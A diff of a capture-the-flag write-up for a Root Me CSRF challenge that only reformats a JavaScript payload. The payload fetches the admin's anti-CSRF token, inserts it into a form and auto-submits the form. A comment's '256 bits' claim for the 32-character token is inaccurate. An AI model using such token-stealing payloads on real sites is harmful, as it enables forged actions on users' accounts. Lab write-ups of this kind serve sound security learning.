@@ -55,24 +55,24 @@ The most convenient way is using AJAX. ( FYI: AJAX supports many **http verbs** 
 
 ```javascript
 
-            // You can run line-by-line to debug and see the result in "Console" tab
-            // Create a "GET" Request  
-            var getRequest = new XMLHttpRequest();
+// You can run line-by-line to debug and see the result in "Console" tab
+// Create a "GET" Request  
+var getRequest = new XMLHttpRequest();
 
-            // Little tricky here ! We should set 3rd parameter to "false" value. It means we turn off "asynchronous". 
-            //If not, GET request will run seperately and "tokenAdmin" is created before the token's data from the form return; therefore, "tokenAdmin" returns "null"
-            getRequest.open("GET", "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile", false);
+// Little tricky here ! We should set 3rd parameter to "false" value. It means we turn off "asynchronous". 
+// If not, GET request will run seperately and "tokenAdmin" is created before the token's data from the form return; therefore, "tokenAdmin" returns "null"
+getRequest.open("GET", "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile", false);
 
-            // Send it to server.
-            getRequest.send();
+// Send it to server.
+getRequest.send();
 
-            // Use regex to get the token from admin; Our token is a hash having a fixed value of 32 characters (256 bits)
-            var tokenAdmin = getRequest.response.match(/[qwertyuiopasdfghjklzxcvbnm1234567890]{32}/)[0];
+// Use regex to get the token from admin; Our token is a hash having a fixed value of 32 characters (256 bits)
+var tokenAdmin = getRequest.response.match(/[qwertyuiopasdfghjklzxcvbnm1234567890]{32}/)[0];
 
-            // Change the value of token in the form to admin'token for submitting
-            document.getElementById('token').value = tokenAdmin;
-            // Auto submit the form 
-            document.getElementById('profile').submit();
+// Change the value of token in the form to admin'token for submitting
+document.getElementById('token').value = tokenAdmin;
+// Auto submit the form 
+document.getElementById('profile').submit();
 
 ```
 
